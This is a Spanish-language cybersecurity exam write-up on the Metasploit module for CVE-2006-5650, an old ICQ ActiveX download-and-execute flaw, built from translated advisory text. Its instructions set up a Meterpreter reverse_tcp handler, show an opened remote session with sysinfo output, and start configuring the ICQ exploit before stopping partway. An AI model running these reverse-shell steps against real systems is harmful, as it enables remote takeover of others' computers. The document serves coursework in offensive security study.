# ciberseguridad-2019-1

Examen Parcial Ciberseguridad 


Este módulo permite a los atacantes remotos descargar y ejecutar archivos arbitrarios en un sistema de usuarios a través de la función DownloadAgent del control ActiveX de ICQPhone.SipxPhoneManager.


Nombre del modulo:  

ID MSF: EXPLOIT/WINDOWS/BROWSER/AOL_ICQ_DOWNLOADAGENT
Type: metasploit	



•	Vulnerabilidad:

CVE-2006-5650 (Módulo de metasploit) (Existe una divulgación informativa considerable). El Impacto de integridad parcial (la modificación de algunos archivos o información del sistema es posible, pero el atacante no tiene control sobre lo que se puede modificar, o el alcance de lo que puede afectar del atacante es limitado). Disponibilidad de impacto parcial (hay un rendimiento reducido o interrupciones en la disponibilidad de recursos). Complejidad de acceso baja (No existen condiciones de acceso especializadas o circunstancias atenuantes. Se requiere muy poco conocimiento o habilidad para explotar). No se requiere autenticación para explotar la vulnerabilidad).
Usuario de acceso ganado, Tipo (s) de vulnerabilidad Ejecutar Código
ID de CWE La ID de CWE no está definida para esta vulnerabilidad

OSVDB-30220: ICQ ICQPhone.SipxPhoneManager ActiveX Control DownloadAgent Función Ejecución de código arbitrario

BID-20930: Vulnerabilidad de ejecución remota de código del control ActiveX en línea de América, Clase: Error de diseño; CVE-2006-5650; Remoto: si ; Local: No, Crédito: a Peter Vreugdenhil se le atribuye el descubrimiento de esta vulnerabilidad.
Vulnerable: ICQ Inc. ICQ 5.1

ZDI-06-037 : Vulnerabilidad de ejecución de código de control ActiveX de ICQ en línea de América
ZDI-06-037
ZDI-CAN-102
CVE ID CVE-2006-5650
PUNTUACIÓN CVSS
VENDEDORES AFECTADOS America Online
PRODUCTOS AFECTADOS ICQ
PROTECCIÓN PARA CLIENTES DE MICRO TENDENCIA Los clientes de Trend Micro TippingPoint IPS están protegidos contra esta vulnerabilidad con el filtro de protección de vacunas digitales con número de identificación 4725 Esta vulnerabilidad permite a los atacantes ejecutar código arbitrario en instalaciones vulnerables de AOL ICQ. La interacción del usuario no es necesaria para explotar esta vulnerabilidad. El defecto específico existe en la función DownloadAgent del control ActiveX de ICQPhone.SipxPhoneManager con el siguiente CLSID: 54BDE6EC-F42F-4500-AC46-905177444300

La función vulnerable toma un solo argumento URI de un archivo para descargar y ejecutar en el contexto del usuario en ejecución. Un avatar de ICQ malicioso se puede usar como un vector de explotación, lo que permite a los atacantes explotar esta vulnerabilidad simplemente enviando un mensaje a un usuario de ICQ objetivo.
DETALLES ADICIONALES

AOL ha publicado una actualización para corregir esta vulnerabilidad el 31/10/2006. La actualización se aplica automáticamente una vez que se conecta al servicio ICQ.

Línea de tiempo de divulgación

CREDITO Peter Vreugdenhil



•	Sistema Operativo: 

⎫	Windows 


•	Software: 


Sistema operativo:

Kali Linux: Diseñada principalmente para la auditoría y seguridad informática en general
Herramientas: Metasploit: proporciona información acerca de vulnerabilidades de seguridad

Modulo: exploit/windows/browser/aol_icq_downloadagent

Modulo: Exploit(multi/handler)



•	Instructivo:

Requisitos:

 
1. MetaSploit instalado (Kali Linux Distribution)


Abrimos la consola de metasploit.
sudo msfconsole
Usamos Handler
msf> use multi/handler
Configuramos el Payload.
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
Configuramos el puerto local.
msf exploit(handler) > set LPORT 444
Configuramos la ip local.
msf exploit(handler) > set LHOST "Nuestra IP local"
Ejecutamos el exploit.
msf exploit(handler) > exploit

msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.0.6:444 
[*] Sending stage (179779 bytes) to 192.168.0.9
[*] Meterpreter session 1 opened (192.168.0.6:444 -> 192.168.0.9:50328) at 2018-05-18 12:00:25 -0500

meterpreter > sysinfo
Computer        : DESKTOP-2MRF5DJ
OS              : Windows 10 (Build 17134).
Architecture    : x64
System Language : es_ES
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows





msf> use exploit/windows/browser/aol_icq_downloadagent
exploit(aol_icq_downloadagent) > show options
msf exploit(aol_icq_downloadagent) > show targets ...targets...
msf exploit(aol_icq_downloadagent) > set SRVHOST 10.195.5.5	
exploit(aol_icq_downloadagent) > show options
msf exploit(aol_icq_downloadagent) > set TARGET 


